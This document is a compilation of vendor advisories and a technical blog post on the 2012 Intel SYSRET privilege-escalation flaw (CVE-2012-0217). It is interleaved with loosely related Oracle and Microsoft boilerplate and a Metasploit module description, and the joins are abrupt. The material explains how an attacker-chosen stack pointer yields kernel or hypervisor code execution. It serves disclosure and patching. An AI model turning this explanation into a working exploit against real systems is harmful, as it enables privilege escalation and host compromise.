In those scenarios where multiple product series are affected, for instance a vulnerability that affects both Windows and Office, the rating reflects the highest risk level across both products. Likewise, the rating reflects the highest risk present across all versions of the product.  In this case, if the Exploitability Assessment on the latest version of Office is "1," and on the latest version of Windows is "2," the rating will reflect "1."  If the XI rating for Windows 10 version 2004 is “2” and the rating for Windows 7 is “1”, the rating will reflect “1”.

## Important Terms and Definitions

**Exploit Code** – A software program or sample code that, when executed against a vulnerable system, uses the vulnerability to spoof attacker identity, tamper with user or system information, repudiate attacker action, disclose user or system information on the server side, deny service to valid users, or elevate privileges for the attacker. For example, if a vulnerability had a security impact of remote code execution, Exploit Code could cause remote code execution to occur when run against a target system.

**Trigger a Vulnerability** – The ability to reach the vulnerable code, but not always achieving the maximum impact. For example, it may be easy to trigger a remote code execution vulnerability, but the resulting effect may only be a denial of service.

* ### What is the Microsoft Exploitability Index?

  The Microsoft Exploitability Index provides additional information to help customers prioritize their deployment of the monthly security updates. Microsoft designed this index to provide customers guidance concerning the likelihood of exploitation, based on each vulnerability addressed by Microsoft security updates.
* ### Why did Microsoft create the Exploitability Index?

  Customers asked for more information to help them prioritize their deployment of Microsoft security updates each month, specifically requesting details about the likelihood of exploitation for the vulnerabilities addressed in security updates. The Exploitability Index provides guidance about the actual risk of exploitation of a vulnerability at the time of the security update’s release.
* ### How are vulnerabilities rated?

  Microsoft Exploitability Index focuses on two aspects of a vulnerability to build its ratings:
  1. Current exploitation trends, based on telemetry data and awareness of exploitation of a particular type of vulnerability in a particular product,
  2. The cost and reliability of building a working exploit for the vulnerability, based on a technical analysis of the vulnerability.
* ### Is this a truly reliable rating system?

  While reliably predicting activity within the security ecosystem is always difficult, there are three reasons why this system should be useful. First, over the last few years we have realized that many security researchers analyze the updates associated with Microsoft's security updates the day they are released to create and evaluate protections. In doing so, many of these researchers also create exploit code to test them. The methodology used to develop this exploit code is like the one Microsoft uses to determine the likelihood of exploit code release. Microsoft analyzes the updates themselves, the nature of the vulnerability, and the conditions that must be met for an exploit to execute successfully. Second, not all vulnerabilities resolved by our security updates are exploited. A vulnerability may well be technically exploitable with a high degree of reliability, but it may never be exploited. We continuously monitor and track exploitation activity to keep up to date with current trends. This in turn informs our opinion of what constitutes a more attractive vulnerability over similar vulnerabilities, and enables us to more accurately communicate an actual risk, rather than a potential one from the vulnerabilities we patch.
  Finally, we are also partnering with protection providers through the Microsoft Active Protections Program (MAPP), working with them to help validate our predictions each month – thereby using a community approach to ensure better accuracy through information sharing.
* ### How is the Exploitability Index different from the Security Update Severity Rating system?

  The Security Update Severity Rating System assumes that exploitation will be successful. For some vulnerabilities where exploitability is high, this assumption is very likely to be true for a broad set of attackers. For other vulnerabilities where exploitability is low, this assumption may only be true when a dedicated attacker puts a lot of resources into ensuring their attack is successful. Regardless of the Severity or Exploitability Index rating, Microsoft always recommends that customers deploy all applicable and available updates; however, this rating information can assist sophisticated customers in prioritizing their approach to each month's release.
* ### How are Denial of Service, Tampering, Information Disclosure, or Spoofing issues rated?

  The Exploitability Index does not differentiate between vulnerability types. It focuses on the likelihood of exploitation of each vulnerability within the range of their full impact potential. Thus, any vulnerability, whether it is Remote Code Execution, Tampering or other, could be rated any of the Exploitability Index ratings.
* ### What happens when newly emerging information requires an update to the Exploitability Index rating?

  The ability to rate the possible exploitation of vulnerabilities is an evolving science, and new techniques for exploitation in general, or unique techniques specific to a vulnerability, or new trends in detected exploits of particular products may be discovered that could change the Exploitability Index rating. However, the goal of the Exploitability Index is to help customers prioritize those updates for the most current monthly release. Therefore, if there is information that would change an assessment released in the first month of a security release, Microsoft will update the Exploitability Index. If information becomes available in subsequent months, after most customers have made their prioritization decisions, the Exploitability Index will not be updated as it is no longer useful to the customer. When an Exploitability Index rating is corrected in a way that reflects increased risk to customers, the security update revision is incremented at a major version number (for instance, from 1.0 to 2.0). When risk is adjusted downwards, the update revision is incremented at a minor version number (for instance, from 1.0 to 1.1).
* ### How does the Exploitability Index relate to the Common Vulnerability Scoring System (CVSS) and other rating systems?

  The Exploitability Index is separate and not related to other rating systems. However, the MSRC is a contributing member to the Common Vulnerability Scoring System (CVSS), and Microsoft shares its experience and customer feedback in building and releasing the Exploitability Index with the working group in order to help ensure the CVSS is effective and actionable.

## Synopsis

Important: kernel security update

## Type/Severity

Security Advisory: Important

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2012%3A0721)

## Topic

Updated kernel packages that fix two security issues are now available for
Red Hat Enterprise Linux 5.

The Red Hat Security Response Team has rated this update as having
important security impact. Common Vulnerability Scoring System (CVSS) base
scores, which give detailed severity ratings, are available for each
vulnerability from the CVE links in the References section.

## Description

The kernel packages contain the Linux kernel, the core of any Linux
operating system.

This update fixes the following security issues:

* It was found that the Xen hypervisor implementation as shipped with Red

Hat Enterprise Linux 5 did not properly restrict the syscall return
addresses in the sysret return path to canonical addresses. An unprivileged
user in a 64-bit para-virtualized guest, that is running on a 64-bit host
that has an Intel CPU, could use this flaw to crash the host or,
potentially, escalate their privileges, allowing them to execute arbitrary
code at the hypervisor level. (CVE-2012-0217, Important)

* It was found that guests could trigger a bug in earlier AMD CPUs, leading

to a CPU hard lockup, when running on the Xen hypervisor implementation. An
unprivileged user in a 64-bit para-virtualized guest could use this flaw to
crash the host. Warning: After installing this update, hosts that are using
an affected AMD CPU (refer to Red Hat Bugzilla bug #824966 for a list) will
fail to boot. In order to boot such hosts, the new kernel parameter,
allow\_unsafe, can be used ("allow\_unsafe=on"). This option should only be
used with hosts that are running trusted guests, as setting it to "on"
reintroduces the flaw (allowing guests to crash the host). (CVE-2012-2934,
Moderate)

Note: For Red Hat Enterprise Linux guests, only privileged guest users can
exploit the CVE-2012-0217 and CVE-2012-2934 issues.

Red Hat would like to thank the Xen project for reporting these issues.
Upstream acknowledges Rafal Wojtczuk as the original reporter of
CVE-2012-0217.

Users should upgrade to these updated packages, which contain backported
patches to correct these issues. The system must be rebooted for this
update to take effect.

## Solution

Before applying this update, make sure all previously-released errata
relevant to your system have been applied.

This update is available via the Red Hat Network. Details on how to
use the Red Hat Network to apply this update are available at
<https://access.redhat.com/knowledge/articles/11258>

To install kernel packages manually, use "rpm -ivh [package]". Do not
use "rpm -Uvh" as that will remove the running kernel binaries from
your system. You may use "rpm -e" to remove old kernels after
determining that the new kernel functions properly on your system.

CVE Name: CVE-2012-0217
For general information regarding FreeBSD Security Advisories,
including descriptions of the fields above, security branches, and the
following sections, please visit .
0. Revision History
v1.0 2012-06-12 Initial release.
v1.1 2012-06-19 Corrected patch FreeBSD 8.1.
I. Background
The FreeBSD operating system implements a rings model of security, where
privileged operations are done in the kernel, and most applications
request access to these operations by making a system call, which puts
the CPU into the required privilege level and passes control to the
kernel.
II. Problem Description
FreeBSD/amd64 runs on CPUs from different vendors. Due to varying
behaviour of CPUs in 64 bit mode a sanity check of the kernel may be
insufficient when returning from a system call.
III. Impact
Successful exploitation of the problem can lead to local kernel privilege
escalation, kernel data corruption and/or crash.
To exploit this vulnerability, an attacker must be able to run code with user
privileges on the target system.
IV. Workaround
No workaround is available.
However FreeBSD/amd64 running on AMD CPUs is not vulnerable to this
particular problem.
Systems with 64 bit capable CPUs, but running the 32 bit FreeBSD/i386
kernel are not vulnerable, nor are systems running on different
processor architectures.
V. Solution
Perform one of the following:
1) Upgrade your vulnerable system to 7-STABLE, 8-STABLE, or 9-STABLE,
or to the RELENG\_7\_4, RELENG\_8\_3, RELENG\_8\_2, RELENG\_8\_1, or RELENG\_9\_0
security branch dated after the correction date.
2) To update your vulnerable system via a source code patch:
The following patches have been verified to apply to FreeBSD 7.4,
8.3, 8.2, 8.1 and 9.0 systems.
a) Download the relevant patch from the location below, and verify the
detached PGP signature using your PGP utility.

# The Intel SYSRET privilege escalation

The Xen Security team recently disclosed a vulnerability, Xen Security Advisory 7 (CVE-2012-0217), which would allow guest administrators to escalate to hypervisor-level privileges. The impact is much wider than Xen; many other operating systems seem to have the same vulnerability, including NetBSD, FreeBSD, some versions of Microsoft Windows (including Windows 7).

So what was the vulnerability? It has to do with a subtle difference in the way in which Intel processors implement error handling in their version of AMD’s `SYSRET` instruction. The `SYSRET` instruction is part of the x86-64 standard defined by AMD. If an operating system is written according to AMD’s spec, but run on Intel hardware, the difference in implementation can be exploited by an attacker to write to arbitrary addresses in the operating system’s memory. This blog will explore the technical details of the vulnerability.

It should be noted that there are some questions about the way in which the disclosure process for this vulnerability was handled. In order to make sure that everyone can fully participate in the discussion, including system administrators who may at this moment be patching their systems, there has been a conscious decision to postpone any discussion about the disclosure process for one week, until the 19th of June.

# Introduction: Canonical addresses, Context switch, and SYSRET

The first concept to understand is that of *canonical addresses*. When designing the 64-bit extensions to x86, AMD didn’t extend the actual virtual address space to a full 64 bits, but only to 48 bits. (This was mainly done to balance the benefits of extended address spaces with the cost of extra levels of the page table: 64 bits of virtual address space would have required a 6-level pagetable; 48 bits gives you 256 terabytes of virtual address space, far more than the largest machines will have for many years to come, and only requires 4 levels of pagetable.)

They could have made the processor just ignore the extra 16 bits of address space, but clever programmers have a tendency to take advantage of these kinds of quirks to do things like storing extra information in the “unused” portions of virtual addresses. These clever tricks would break, however, if the processors ever decided to extend the address space into more bits. In order to prevent this, they put in restrictions to the microprocessor: Any 64-bit value that is used as a virtual address (for instance, written into the instruction pointer register, `RIP`) must be in *canonical form*: That is, bits 48-63 must be the same as bit 47. Valid (or “canonical”) addresses space thus exists in two non-contiguous 128-terabyte chunks: from `0x0000000000000000-0x00007fffffffffff`, and then from `0xffff800000000000-0xffffffffffffffff`. Any time a 64-bit value is used as a virtual address that does not fit in one of these two ranges, the processor will throw a general protection fault (`#GP`).

The next thing to understand is the process of context switching between the guest and the hypervisor. Whenever switching from a lower privilege to a higher privelege (either a kernel or a hypervisor), the registers of the lower-level privilege must be saved and replaced with those of the higher privilege. When an interrupt or exception is delivered while in guest mode, the `RIP`, stack pointer, and code segment (which encodes the privilege level) are changed by the hardware; the hypervisor then stores the rest of the guest state on its stack, and handles the interrupt.

In the early days of x86, a system call was treated as a special-case of an interrupt or exception: typically the guest would execute INT instruction to enter the hypervisor or operating system, and the hypervisor would execute IRET to return to the guest. But both AMD and Intel’s performance analysis teams determined that for processes which made a significant number of system calls, going through the normal exception path in the processor was significantly slower. So they independently came up with special instructions for voluntarily escalating privilege: AMD came up with `SYSCALL`/`SYSRET`, and Intel came up with `SYSENTER`/`SYSEXIT`. They have slightly different semantics, and they’re not available in all modes on both processors. Since `SYSRET` is part of the x86-64 standard, and available on all processors in 64-bit mode, it’s common for 64-bit operating systems and hypervisors to use it exclusively.

Intel’s version of SYSRET, however, has a very subtle difference in behavior than AMD’s version. It is this difference that is the source of the problem.

# SYSRET on Intel and AMD

The key difference between `SYSCALL`/`SYSRET` and `INT` / `IRET` is how much information is stored and where. `SYSCALL`/`SYSRET` instructions only save and restore the `RIP` of the guest, as well as changing the code segment selector (which effectively changes the privilege level). Furthermore, rather than reading IDTs and writing to stack frames, the instructions copy the guest `RIP` to and from the `RCX` register, and the segment selectors and hypervisor `RIP` to and from various other processor registers. The hypervisor is responsible for saving and restoring all of the other registers, including the stack pointer (`RSP`).

So the end-to-end effect of the `SYSRET` instruction, on both Intel and AMD, is as follows:

* Load `RIP` from `RCX`
* Change code segment selector to guest mode

Now, as we said before, `RIP` is used as a virtual address, so it must be canonical. `RCX`, however, is a general purpose register, and may contain any 64-bit number. So if for some reason there is a non-canonical address in `RCX`, upon executing the `SYSRET` instruction, the processor will throw a general protection fault (`#GP`).

Now here comes the subtle difference. The AMD and Intel architecture specifications include pseudocode that is meant to be a precise description of what the instruction does. In the AMD pseudocode, there is no explicit mention of the check for a canonical address; however, the actual `RIP` is not assigned until after the privilege level has been changed back to guest mode; and experimentation has confirmed that a `SYSRET` executed on AMD with a non-canonical address in `RCX` will throw the `#GP` in guest mode. However, in the Intel pseudocode, the check for a guest canonical address is explicit, and happens before the privilege level is changed. This means that if a `SYSRET` is executed on an Intel processor with a non-canonical address in `RCX`, the processor will throw a `#GP` in priveleged mode.

It’s a subtle difference, but it’s important, because the value of the stack pointer used when the processor delivers a `#GP` will change depending on the privilege level. If a `#GP` is delivered in guest mode, the processor will load the hypervisor’s `RSP` from a special hypervisor-designated entry point. But if the `#GP` is delivered while in hypervisor mode, the processor will use the current `RSP`, so that it can effectively “nest” the exception.

But recall that the `SYSRET` instruction doesn’t restore the `RSP`; the hypervisor has to do that. So by the time the `#GP` happens, the hypervisor has already restored the `RSP` to what was in the *guest’s* `RSP` when it did the `SYSCALL`, along with all of the other general-purpose registers.

So if the guest can induce the hypervisor to have a non-canonical `RIP` to return to, it can set the `RSP` to any value it wants to in hypervisor memory, and get the hardware (in delivering a `#GP`) to overwrite it. This can in turn be leveraged into a full exploit (the details of which are left as an exercise to the reader).

The fix in Xen’s case is, on the `SYSRET` return path, to check to make sure that RCX is canonical. If it is not, Xen will fall back to the slower `IRET` path, which will behave as expected.

# The fall-out

I’ve used “hypervisor” and “guest” because that’s how it affects Xen; but it should be clear that the same exact attack might work against operating systems as well. And it turns out that it does. It seems that 64-bit versions of NetBSD, FreeBSD, and Microsoft Windows 7 were all vulnerable.

OpenBSD and Linux were not vulnerable. Linux actually fixed the bug in 2006, with [CVE-2006-0744](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-0744&ref=xenproject.org). But the description says “Linux kernel before 2.6.16.5 does not properly handle uncanonical return addresses on Intel EM64T CPUs…”, which makes it sound like something Linux-specific. It’s therefore not surprising that it attracted little notice from other operating systems.

Because Intel’s implementation of SYSRET matches their published spec, they consider their processors to be behaving correctly. However, the `SYSRET` instruction was defined by AMD as part of the x86-64 architecture, and Intel’s version is obviously intended to be compatible with AMD’s version. If the majority of operating systems (acting independently) managed to “not properly handle uncanonical return addresses on Intel EM64T CPUs”, it’s hard not to conclude that Intel made a mistake when designing their specification.

#### Risk Matrix Content

Risk matrices list only security vulnerabilities that are newly fixed by the patches associated with this advisory. Risk matrices for previous security fixes can be found in [previous Critical Patch Update advisories.](/security-alerts/) An English text version of the risk matrices provided in this document is available [here.](/security-alerts/cpuoct2012verbose.html)

Several vulnerabilities addressed in this Critical Patch Update affect multiple products. Each vulnerability is identified by a [CVE#](//cve.mitre.org/)  which is a unique identifier for a vulnerability. A vulnerability that affects multiple products will appear with the same **CVE#** in all risk matrices. Italics indicate vulnerabilities in code included from other product areas.

Security vulnerabilities are scored using CVSS version 2.0 (see [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) for an explanation of how Oracle applies CVSS 2.0). Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update (CPU). Oracle does not disclose information about the security analysis, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. As a matter of policy, Oracle does not disclose detailed information about an exploit condition or results that can be used to conduct a successful exploit. Oracle will not provide additional information about the specifics of vulnerabilities beyond what is provided in the CPU or Security Alert notification, the Patch Availability Matrix, the readme files, and FAQs. Oracle does not provide advance notification on CPUs or Security Alerts to individual customers. Finally, Oracle does not distribute exploit code or proof of concept code for product vulnerabilities. For more information, see [Oracle vulnerability disclosure policies.](/corporate/security-practices/assurance/vulnerability/disclosure.html)

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply CPU fixes as soon as possible.**Until you apply the CPU fixes, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security fixes as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security fixes announced in this CPU, please review previous [Critical Patch Update advisories](/security-alerts/) to determine appropriate actions.

### Product Dependencies

Oracle products may have dependencies on other Oracle products. Hence security vulnerability fixes announced in this Critical Patch Update may affect one or more dependent Oracle products. For details regarding these dependencies and to apply patches to dependent products, please refer to Patch Set Update and Critical Patch Update October 2012 Availability Document, [My Oracle Support Note 1477727.1.](//support.oracle.com/epmos/faces/DocumentDisplay?_afrLoop=362781981699557&id=1477727.1&_afrWindowMode=0&_adf.ctrl-state=s6zpu55c3_450)

### Critical Patch Update Supported Products and Versions

Critical Patch Update patches are provided only for product versions that are covered under the Premier Support or Extended Support phases of the [Lifetime Support Policy.](/support/lifetime-support/) We recommend that customers plan product upgrades to ensure that Critical Patch Update patches are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, customers are recommended to upgrade to supported versions.

Supported Database, Fusion Middleware, Oracle Enterprise Manager Base Platform (formerly "Oracle Enterprise Manager Grid Control") and Collaboration Suite products are patched in accordance with the Software Error Correction Support Policy explained in [My Oracle Support Note 209768.1.](//support.oracle.com/epmos/faces/DocumentDisplay?_afrLoop=363176798276854&id=209768.1&_afrWindowMode=0&_adf.ctrl-state=s6zpu55c3_499) Please review the [Technical Support Policies](/support/policies.html) for further guidelines regarding support policies and phases of support.

### Products in Extended Support

Critical Patch Update patches are available to customers who have purchased Extended Support under the [Lifetime Support Policy.](/support/lifetime-support/) Customers must have a valid Extended Support service contract to download Critical Patch Update patches for products in the Extended Support Phase.

### *On Request* Model

Oracle proactively creates patches only for platform/version combinations that, based on historical data, customers are likely to download for the next Critical Patch Update. Patches for historically inactive platform/version combinations of the Oracle Database, Oracle Application Server and Enterprise Manager will be created only if requested by customers.

Refer to Patch Set Update and Critical Patch Update October 2012 Availability Document, [My Oracle Support Note 1477727.1](//support.oracle.com/epmos/faces/DocumentDisplay?_afrLoop=363408080296133&id=1477727.1&_afrWindowMode=0&_adf.ctrl-state=s6zpu55c3_548) for further details regarding the On Request patches.

#### Oracle E-Business Suite Executive Summary

This Critical Patch Update contains 9 new security fixes for the Oracle E-Business Suite. 6 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without the need for a username and password. The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuoct2012verbose.html#EBS)

Oracle E-Business Suite products include [Oracle Database](#AppendixDB) and [Oracle Fusion Middleware](#AppendixFMW) components that are affected by the vulnerabilities listed in the Oracle Database and Oracle Fusion Middleware sections. The exposure of Oracle E-Business Suite products is dependent on the Oracle Database and Oracle Fusion Middleware versions being used. Oracle Database and Oracle Fusion Middleware security fixes are not listed in the Oracle E-Business Suite risk matrix. However, since vulnerabilities affecting Oracle Database and Oracle Fusion Middleware versions may affect Oracle E-Business Suite products, Oracle recommends that customers apply the October 2012 Critical Patch Update to the Oracle Database and Oracle Fusion Middleware components of Oracle E-Business Suite. For information on what patches need to be applied to your environments, refer to Oracle E-Business Suite Critical Patch Update for October 2012, [My Oracle Support Note 1486535.1.](https://support.oracle.com/epmos/faces/DocumentDisplay?_afrLoop=372444516381159&id=1486535.1&_afrWindowMode=0&_adf.ctrl-state=z3adklgdg_53)

Package        : kfreebsd-8
Vulnerability  : privilege escalation
Problem type   : local
Debian-specific: no
CVE ID         : CVE-2012-0217
Debian Bug     : 677297

Rafal Wojtczuk from Bromium discovered that FreeBSD wasn't handling correctly
uncanonical return addresses on Intel amd64 CPUs, allowing privilege escalation
to kernel for local users.

For the stable distribution (squeeze), this problem has been fixed in
version 8.1+dfsg-8+squeeze3.

For the testing distribution (wheezy), this problem has been fixed in
version 8.3-4.

For the unstable distribution (sid), this problem has been fixed in
version 8.3-4.

We recommend that you upgrade your kfreebsd-8 packages.

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be

## SYSRET 64-bit operating system privilege escalation vulnerability on Intel CPU hardware

#### Vulnerability Note VU#649219

Original Release Date: 2012-06-12 | Last Revised: 2012-09-04

---

### Overview

Some 64-bit operating systems and virtualization software running on Intel CPU hardware are vulnerable to a local privilege escalation attack. The vulnerability may be exploited for local privilege escalation or a guest-to-host virtual machine escape.

Intel claims that this vulnerability is a software implementation issue, as their processors are functioning as per their documented specifications. However, software that fails to take the Intel-specific SYSRET behavior into account may be vulnerable.

### Description

| A [ring3 attacker](http://en.wikipedia.org/wiki/Ring_3) may be able to specifically craft a stack frame to be executed by ring0 (kernel) after a general protection exception (#GP). The fault will be handled before the stack switch, which means the exception handler will be run at ring0 with an attacker's chosen RSP causing a privilege escalation.**Details from Xen**[*CVE-2012-0217 / XSA-7 - 64-bit PV guest privilege escalation vulnerability*](http://lists.xen.org/archives/html/xen-announce/2012-06/msg00001.html)*A vulnerability which can allow a 64-bit PV guest kernel running on a 64-bit hypervisor to escalate privileges to that of the host by arranging for a system call to return via sysret to a non-canonical RIP. Intel CPUs deliver the resulting exception in an undesirable processor state.***Details from FreeBSD**[*FreeBSD-SA-12:04.sysret:**Privilege escalation when returning from kernel*](http://security.freebsd.org/advisories/FreeBSD-SA-12%3A04.sysret.asc)*FreeBSD/amd64 runs on CPUs from different vendors. Due to varying behaviour of CPUs in 64 bit mode a sanity check of the kernel may be insufficient when returning from a system call. Successful exploitation of the problem can lead to local kernel privilege escalation, kernel data corruption and/or crash.***Details from Microsoft**[*User Mode Scheduler Memory Corruption Vulnerability -* *MS12-042 - Important*](http://technet.microsoft.com/en-us/security/bulletin/MS12-042)*An elevation of privilege vulnerability exists in the way that the Windows User Mode Scheduler handles system requests. An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode. An attacker could then install programs; view, change, or delete data; or create new accounts with full administrative rights.**Mitigating Factors for User Mode Scheduler Memory Corruption Vulnerability**Mitigation refers to a setting, common configuration, or general best-practice, existing in a default state, that could reduce the severity of exploitation of a vulnerability. The following mitigating factors may be helpful in your situation:*     + *An attacker must have valid logon credentials and be able to log on locally to exploit this vulnerability. The vulnerability could not be exploited remotely or by anonymous users.* + *This vulnerability only affects Intel x64-based versions of Windows 7 and Windows Server 2008 R2.* + *Systems with AMD or ARM-based CPUs are not affected by this vulnerability.*  **Details from Red Hat**[*RHSA-2012:0720-1*](https://rhn.redhat.com/errata/RHSA-2012-0720.html) *&* [*RHSA-2012:0721-1*](https://rhn.redhat.com/errata/RHSA-2012-0721.html)*:* *It was found that the Xen hypervisor implementation as shipped with Red Hat Enterprise Linux 5 did not properly restrict the syscall return addresses in the sysret return path to canonical addresses. An unprivileged user in a 64-bit para-virtualized guest, that is running on a 64-bit host that has an Intel CPU, could use this flaw to crash the host or, potentially, escalate their privileges, allowing them to execute arbitrary code at the hypervisor level. (CVE-2012-0217, Important)*Details from some affected vendors were not available at the time of publication. |

### [Citrix](#MORO-8V9FNG) Affected

Updated:  June 18, 2012

### Status

Affected

### Vendor Statement

A number of security vulnerabilities have been identified in Citrix XenServer. These vulnerabilities affect all currently supported versions of Citrix XenServer up to and including version 6.0.2.

The following issues have been addressed:

 • 64-bit PV guest to host privilege escalation vulnerability. This issue only impacts servers running on Intel processors and could permit a 64-bit PV guest to compromise the XenServer host (CVE-2012-0217).

 • Guest denial of service on syscall/sysenter exception generation. This issue could permit user code within a PV guest to crash the guest operating system (CVE-2012-0218).

 • Administrative connections to VM consoles through XAPI or XenCenter could be routed to the wrong VM.

      'Description'    => %q{
        This module exploits a vulnerability in the FreeBSD kernel,
        when running on 64-bit Intel processors.

        By design, 64-bit processors following the X86-64 specification will
        trigger a general protection fault (GPF) when executing a SYSRET
        instruction with a non-canonical address in the RCX register.

        However, Intel processors check for a non-canonical address prior to
        dropping privileges, causing a GPF in privileged mode. As a result,
        the current userland RSP stack pointer is restored and executed,
        resulting in privileged code execution.

        This module has been tested successfully on:

        FreeBSD 8.3-RELEASE (amd64); and
        FreeBSD 9.0-RELEASE (amd64).

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

**Description**

The syscall and sysret instruction expect to be given a canonical x86 address when called. On Intel processors it is the expectation of the operating system to verify that the address being is in fact canonical. If we find that the address is not canonical, instead of taking the normal fast path which would have us execute a sysret, we should instead go through the longer syscall path which we normally enter when we have to handle things like signals. This causes us to instead exit with an iretq which can handle the non-canonical address.

Severity: local DoS, local user privilege escalation
Fixed: NetBSD-current: June 12th, 2012
NetBSD-6 branch: June 12th, 2012
NetBSD-5 branch: June 12th, 2012

Please note that NetBSD releases prior to 4.0 are no longer supported.
It is recommended that all users upgrade to a supported release.
Abstract
========
On Intel CPUs, the sysret instruction can be manipulated into returning
to specific non-canonical addresses, which may yield a CPU reset.
It has been shown by the VUPEN team that this vulnerability can also be
used to execute code with kernel privilege instead of crashing the system.
This vulnerability has been assigned CVE-2012-0217.
Technical Details
=================
This is a vulnerability following from a difference of behaviour of
sysret in Intel's version of the amd64 architecture, em64t.
System calls may be implemented as using the em64t syscall/sysret
instruction pair.
syscall saves the context of the calling unprivileged process before
executing a system call in kernel mode; sysret restores it and resumes
ordinary operations in user mode.
In the Intel implementation of sysret, if you have invalid information
about the "next instruction" address in your saved context, the sysret
instruction will trigger a trap in kernel space. However the sysret
instruction is executed with the user stack pointer already loaded,
so the kernel fault frame is written to the user stack.
The kernel is unable to safely recover from this, so must ensure
that the trap doesn't happen.
If your invalid "next instruction" address is in kernel space or
in user space (and in the latter case, not where your program is)
the program will segfault or execute attacker controlled code.
If it is in the gap between user space and kernel space, the CPU
will reset, except if someone managed to seed the address location
with a valid instruction.
Solutions and Workarounds
=========================
The fix in the following versions will disallow sysret to
an invalid address.
